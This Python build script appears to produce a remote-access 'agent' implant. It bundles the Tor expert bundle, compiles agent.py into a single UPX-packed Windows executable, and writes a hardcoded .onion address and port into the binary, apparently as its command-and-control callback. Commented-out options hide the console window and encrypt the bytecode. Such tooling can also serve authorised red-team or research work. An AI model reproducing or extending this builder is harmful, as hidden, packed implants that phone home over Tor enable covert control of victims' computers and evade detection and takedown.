import PyInstaller.__main__
import requests
import os
import zipfile
import sys

#This command works well and produces out without error
# PyInstaller --debug all --onefile --add-data=torbundle:torbundle --upx-dir=upx-3.96-win64 agent.py 

def get_tor_expert_bundle():

    os.mkdir('torbundle')
    os.chdir('torbundle')

    tor_url = 'https://archive.torproject.org/tor-package-archive/torbrowser/10.5.6/tor-win32-0.4.5.10.zip'
    file_data = requests.get(tor_url, allow_redirects=True)

    try:
        file = open('tor.zip', 'wb')
        file.write(file_data.content)
    except Exception as error:
        print('[-] Error while writing tor expert bundle: {}'.format(error))
        sys.exit(1)
    else:
        print('[*] Wrote tor expert bundle to file')

    file = zipfile.ZipFile('tor.zip')
    file.extractall('.')
    print("[*] Unpacked Tor expert bundle")

    os.chdir('..')


def append_address(onion, port):
    port = str(port)
    #for path in ['/executables/client_linux', '/executables/client_win.exe']:
    for path in ['./dist/agent.exe']:
        with open(path, 'a') as file:
            file.write(onion)
            if len(port) < 5:
                rest = 5 - len(port)
                port = rest * '0' + port
            file.write(port)
    print('Executable agent build completed sucessfully.')

#without tor bundle ->16500kb ----- with tor bundle->22986kb
if __name__ == '__main__':
    if not os.path.isdir('torbundle') and os.name == 'nt':
        get_tor_expert_bundle()


    #If needed to encrypt the executable:
    # encryption_key_charset = ascii_uppercase + ascii_lowercase + digits
    # encryption_key = ''.join(choice(encryption_key_charset) for _ in range(16))
    # pyinstaller_args = ['agent.py', '--onefile', '--key={}'.format(encryption_key)]
    # pyinstaller_args_windows = ['--add-data=torbundle;torbundle', '--upx-dir=upx-3.96-win64']
    # pyinstaller_args_linux = ['--add-data=tor_linux:tor_linux', '--upx-dir=upx-3.96-amd64_linux/']
    
    # if os.name == 'nt':
    PyInstaller.__main__.run([
        'agent.py',
        '--onefile',
        # '--debug-all',
        # '--noconsole',
        '--add-data=torbundle:torbundle',
        '--upx-dir=upx-3.96-win64'
    ])
    # else:
    #     PyInstaller.__main__.run([
    #         'agent.py',
    #         '--onefile',
    #     ])

    #enter the onion address and port here
    onion = "ag64ftjmmnncugvzodom2abgolere2bjmk2l6vs42trtpjcy2sx2b3yd.onion"
    port = 80
    append_address(onion, port)
